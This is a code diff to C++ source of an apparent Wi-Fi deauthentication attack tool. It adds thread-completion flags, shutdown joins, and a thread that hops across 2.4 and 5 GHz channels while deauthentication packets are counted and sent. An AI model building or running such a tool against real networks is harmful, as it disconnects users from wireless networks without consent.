@@ -46,6 +46,9 @@ void split(const char * to_split, char by, char ** head, char ** tail);
 void quit(int);
 
 atomic_bool working;
+atomic_bool deauth_done;
+atomic_bool sniffer_done;
+atomic_bool channel_done;
 condition_variable cond;
 vector<DeauthClient> specify;
 vector<DeauthClient> deauth;
@@ -128,6 +131,9 @@ int main(int argc, const char * argv[]) {
     
     if (ifname.open() && (deauth.size() + specify.size() > 0 || all)) {
         working = true;
+        deauth_done = false;
+        channel_done = false;
+        sniffer_done = false;
         signal(SIGINT, quit);
         
         Sniffer sniffer(ifname);
@@ -198,6 +204,7 @@ int main(int argc, const char * argv[]) {
                         }
                     }
                 }
+                if (!working) sniffer_done = true;
                 return working;
             });
         }
@@ -223,16 +230,38 @@ int main(int argc, const char * argv[]) {
                     fprintf(stdout, "%llu deauthentication packets sent!\r", count);
                     fflush(stdout);
                 }
+                if (!working) {
+                    deauth_done = true;
+                    return;
+                }
                 usleep(5000);
             }
         }};
+        
+        std::thread channel_change([&]{
+            while (working) {
+#if defined(__APPLE__)
+                vector<uint8_t> channels = {1,2,3,4,5,6,7,8,9,10,11,12,13,36,40,44,48,52,56,60,64,149,153,157,161,165};
+#elif defined(__RASPBIAN__)
+                vector<uint8_t> channels = {1,2,3,4,5,6,7,8,9,10,11};
+#endif
+                for (uint8_t chan : channels) {
+                    if (!working) channel_done = true;
+                    ifname.setChannel(chan);
+                    sleep(1);
+                }
+            }
+        });
         
         std::mutex mtx;
         std::thread ([&]{
             std::unique_lock<std::mutex> lock(mtx);
             cond.wait(lock);
             working = false;
+            worker.join();
+            channel_change.join();
             fprintf(stdout, "\r%llu deauthentication packets sent in total!\n", count);
+            while (!deauth_done || !channel_done || !sniffer_done) this_thread::yield();
         }).join();
     }
     
